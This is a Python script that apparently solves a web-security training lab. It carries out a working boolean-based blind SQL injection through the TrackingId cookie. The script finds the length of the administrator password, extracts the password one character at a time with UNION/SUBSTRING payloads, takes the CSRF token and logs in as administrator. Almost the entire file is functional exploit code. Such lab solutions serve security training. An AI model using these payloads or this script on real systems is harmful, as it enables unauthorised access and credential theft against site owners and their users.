from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import argparse
import requests
import urllib3
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", action="store_true")
    return parser.parse_args()


def print_info(string, end="\n"):
    print(f"\r\033[1;94m[*]\033[00m {string}", end=end)


def print_success(string, end="\n"):
    print(f"\r\033[1;92m[+]\033[00m {string}", end=end)


def print_fail(string):
    print(f"\r\033[1;91m[-]\033[00m {string}")
    exit(1)


def verify_lab_accessible(url):
    print_info("Checking if given URL is accessible...")
    resp = requests.get(url)
    if resp.status_code != 504:
        print_success("URL is accessible.\n")
    else:
        print_fail("URL is inaccessible. Reopen the lab and use new URL.")


def verify_lab_solved(url):
    print_info("Revisiting URL to verify if attack was successful...")
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    if soup.select_one("#notification-labsolved"):
        print_success("Attack successful. Lab solved.")
    else:
        print_fail("Lab unsolved. Ensure...")


def solve_lab(url, proxies):
    print_info(
        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND LENGTH(password)=\033[1;93m?\033[00m --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND LENGTH(password)={len_pass} --"
        }
        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
        soup = BeautifulSoup(resp.text, "html.parser")
        welcome_back = soup.find(string="Welcome back!")

        if welcome_back is None:
            print_info(f"{len_pass} => False", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => True \n")
            break

    print_info(
        f'Determining administrator password by visting "{url}" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND SUBSTRING(password, \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password, {i+1}, 1)='{c}' --"
            }
            resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
            soup = BeautifulSoup(resp.text, "html.parser")
            welcome_back = soup.find(string="Welcome back!")

            if welcome_back is None:
                print_info(f"{i+1}, '{c}' => False | Progress: {password}...", end="")
            else:
                print_success(
                    f"{i+1}, '{c}' => True  | Progress: {password}...", end=""
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": "administrator", "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")


def main():
    args = get_args()
    root_url = urljoin(args.url, "/")

    verify_lab_accessible(root_url)

    proxies = None
    if args.use_proxy:
        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
        print_info('Using "http://127.0.0.1:8080" as a proxy')

    solve_lab(root_url, proxies)
    verify_lab_solved(root_url)


if __name__ == "__main__":
    main()
